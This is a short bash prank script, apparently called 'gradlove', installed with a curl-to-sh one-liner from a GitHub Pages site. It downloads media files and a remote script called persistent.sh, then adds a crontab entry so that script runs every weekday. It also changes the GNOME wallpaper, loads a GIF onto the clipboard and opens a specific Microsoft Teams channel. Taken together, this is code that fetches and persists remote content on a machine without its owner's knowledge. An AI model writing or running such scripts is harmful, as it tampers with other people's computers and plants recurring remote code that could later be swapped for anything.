#!/bin/bash

# Usage:
# Open Terminal (Ctrl + Alt + T) and type:
# curl -sSf https://juanbanpar.github.io/gradlove/amor.sh | sh

mkdir /home/$USER/amor

WallpaperURL="https://juanbanpar.github.io/gradlove/files/wall.jpg"
GifURL="https://juanbanpar.github.io/gradlove/files/heart-locket.gif"
MusicURL="https://juanbanpar.github.io/gradlove/files/music.wav"
PersistentURL="https://juanbanpar.github.io/gradlove/files/persistent.sh"
ReadmeURL="https://juanbanpar.github.io/gradlove/README_LINUX.txt"
DownloadDirectory="/home/$USER/amor"
ReadmeDirectory="/home/$USER/Escritorio"

WallFile=$(basename "$WallpaperURL")
GifFile=$(basename "$GifURL")
MusicFile=$(basename "$MusicURL")
PersistentFile=$(basename "$PersistentURL")
ReadmeFile=$(basename "$ReadmeURL")

# Downloads SO MUCH LOVE
wget -P $DownloadDirectory $WallpaperURL
wget -P $DownloadDirectory $GifURL
wget -P $DownloadDirectory $MusicURL
wget -P $DownloadDirectory $PersistentURL
wget -P $ReadmeDirectory $ReadmeURL

# Make our LOVE last forever (only on working days)
(crontab -l ; echo "00 11 * * 1-5 $DownloadDirectory/$PersistentFile") | crontab -

# Sets LOVE images
gsettings set org.gnome.desktop.background picture-uri file:///${DownloadDirectory}/${WallFile}

# Add to the clipboard LOVE gif
xclip -selection clipboard -t image/jpeg -i ${DownloadDirectory}/${GifFile}

# Open my favourite channel to express HOW MUCH LOVE I have
gnome-www-browser https://teams.microsoft.com/l/channel/19%3acd6d7b457ff84d86b3a182a310139597%40thread.tacv2/Random?groupId=1a0ebcf0-5300-494f-a968-317e4e6c7a42&tenantId=66102552-ecf2-44f2-aeee-14fa85460e0f
